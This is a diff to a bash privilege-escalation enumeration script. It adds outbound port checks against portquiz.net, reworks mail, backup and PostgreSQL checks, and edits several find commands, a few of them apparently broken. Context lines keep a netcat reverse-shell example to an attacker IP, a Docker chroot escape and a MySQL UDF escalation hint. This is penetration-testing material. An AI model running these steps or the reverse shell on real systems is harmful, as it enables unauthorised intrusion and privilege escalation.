@@ -135,7 +135,7 @@ echo -e "\n${BLUE}╔═════{ Are we in Docker:${XX}"
         echo -e "\t║    mkdir /hdd && mount /dev/sda1 /hdd && chroot /hdd                                                               ║"
         echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
 echo -e "\n${BLUE}╔═════{ User ID & Groups possible escap:${XX}"
-    id | grep --color=always -i "docker\|lxd\|auth\|lpadmin\|adm\|sudo\|video\|disk\|disk\|shadow\|fail2ban" 2>/dev/null
+    id | grep --color=always -i "docker\|lxd\|auth\|lpadmin\|adm\|sudo\|video\|disk\|disk\|shadow\|fail2ban\|samashare" 2>/dev/null
         echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
         echo -e "\t║Docker:                                                                                                             ║"
         echo -e "\t║Run:                                                                                                                ║"
@@ -3246,6 +3246,7 @@ echo -e "\n${BLUE}╔═════{ Total number of installed packages:${XX}"
 echo -e "\n${BLUE}╔═════{ Is Ansible Installed on the system:${XX}"
     if [ -d /etc/ansible/ ]; 
         then
+                echo -e "\t Yes"
                 echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
                 echo -e "\t║Ansible is an infrastructure configuration engine that enables IT personnel to dynamically and automatically        ║"
                 echo -e "\t║configure IT infrastructure and computing resources. It works through a “push” model where the Ansible controller   ║"
@@ -3402,13 +3403,13 @@ echo -e "\n${RED}Run this command manually: find / -writable -type f 2>/dev/null
         echo -e "\t║    netcat: echo 'nc <attacker_IP> <attacker_PORT> -e /bin/sh' >> file                                              ║"
         echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
 echo -e "\n${BLUE}╔═════{ World writable directories:${XX}"
-    find / -type d \( -perm -g+w -o -perm -o+w \) -exec ls -lad --color=always {} \; 2>/dev/null
+    find / -type d \( -perm -g+w -o -perm -o+w \) -exec ls -lad --color=always {} \; | head -100 2>/dev/null
 echo -e "\n${BLUE}╔═════{ World executable folders:${XX}"
     find / -perm o=x -type d 2>/dev/null
 echo -e "\n${BLUE}╔═════{ World Writable files:${XX}"
     find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) 2>/dev/null
 echo -e "\n${BLUE}╔═════{ Writable config files:${XX}"
-    find /etc/ -writable -type f 2>/dev/null | xargs ls -la --color=always 2>/dev/null
+    find /etc/ -writable -type f --color=always 2>/dev/null 
 echo -e "\n${BLUE}╔═════{ How Files Can Be Upload/Download:${XX}"
     which wget nc netcat socat python python2 python3 ftp tftp ssh smb | xargs ls -la --color=always
         echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
@@ -3619,6 +3620,9 @@ echo -e "\n${BLUE}╔═════{ Hosts File:${XX}"
 echo -e "\n${BLUE}╔═════{ DNS Server:${XX}"
     cat /etc/resolv.conf | grep nameserver
 echo -e "\n${BLUE}╔═════{ Outbound port connectivity:${XX}"
+echo -e "\n${BLUE}    ══{ Testing Connection:${XX}"
+    ping -c 4 portquiz.net 2>/dev/null
+echo -e "\n${BLUE}    ══{ Scanning Outbound Target:${XX}"
     nmap -sT -p4444-4450 portquiz.net 2>/dev/null
         echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
         echo -e "\t║Knowing this information will come in handy if and when we need to establish outbound connections to other systems  ║"
@@ -3783,7 +3787,12 @@ echo -e "\n${BLUE}╔═════{ Mail Applications:${XX}"
 echo -e "\n${BLUE}╔═════{ Mail File:${XX}"
     ls -la /var/mail/ --color=always 2>/dev/null
 echo -e "\n${BLUE}╔═════{ Reading Mail File:${XX}"
-    cat /var/mail/*
+    if [ -f /var/mail/ ]; 
+        then
+		    cat /var/mail/* 2>/dev/null
+        else
+            echo -e "  ${RED}File does not exist${XX}"
+    fi   
 echo -e "\n${BLUE}╔═════{ List Root Directory:${XX}"
     ls -la /root/
 echo -e "\n${BLUE}╔═════{ Home Directory:${XX}"
@@ -3793,7 +3802,7 @@ echo -e "\n${BLUE}╔═════{ Tmp Directory:${XX}"
 echo -e "\n${BLUE}╔═════{ Backup Directory:${XX}"
     ls -la /var/backups 2>/dev/null && find / -type f  -iname *backup* -o -iname *.bak -o -iname *.bak* -o -iname *.bck -o -iname *.bk -o -iname *.old*  2>/dev/null  | xargs ls -la 2>/dev/null --color=always | grep backup
 echo -e "\n${BLUE}╔═════{ .bak Files:${XX}"
-    find / -iname *.bak -type f 2>/dev/null | xargs ls -la 2>/dev/null
+    find / -iname *.bak -type f 2>/dev/null 2>/dev/null
         echo -e "\t╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
         echo -e "\t║Explore any interesting backup filename.                                                                      ║"
         echo -e "\t╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
@@ -3873,7 +3882,7 @@ echo -e "\n${BLUE}╔═════{ MySQL Version:${XX}"
         echo -e "\t║    https://www.trenchesofit.com/2021/02/15/offensive-security-proving-grounds-banzai-write-up-no-metasploit/ ║"
         echo -e "\t╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
 echo -e "\n${BLUE}╔═════{ Is mysql service running as root:${XX}"
-    ps -aux | grep root | grep mysql 2>/dev/null --color=always
+    ps -aux | grep root | grep mysql --color=always 2>/dev/null 
         echo -e "\t╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
         echo -e "\t║${RED}If so${XX}, escalate privilege root via user defined database functions (UDFs)                                     ║"
         echo -e "\t║    hthttps://steflan-security.com/linux-privilege-escalation-exploiting-user-defined-functions/              ║"
@@ -3932,12 +3941,13 @@ echo -e "\n${BLUE}╔═════{ Spool File:${XX}"
         echo -e "\t║after it has been processed. Read More:                                                     ║"
         echo -e "\t║    https://refspecs.linuxfoundation.org/FHS_3.0/fhs/ch05s14.html                           ║"
         echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════╝"
-echo -e "\n${BLUE}╔═════{ PostgreSQL Version:${XX}"
-    psql -V 2>/dev/null
 echo -e "\n${BLUE}╔═════{ PostgreSQL:${XX}"
     if [ -f /var/lib/pgsql ]; 
         then
-            ls -la /var/lib/pgsql 2>/dev/null
+            echo -e "\n${BLUE}    ══{ Directory:${XX}"
+                ls -la /var/lib/pgsql 2>/dev/null
+            echo -e "\n${BLUE}    ══{ PostgreSQL Version:${XX}"
+                psql -V 2>/dev/null
         else
             echo -e "${RED}	PostgreSQL does not exist${XX}"
     fi
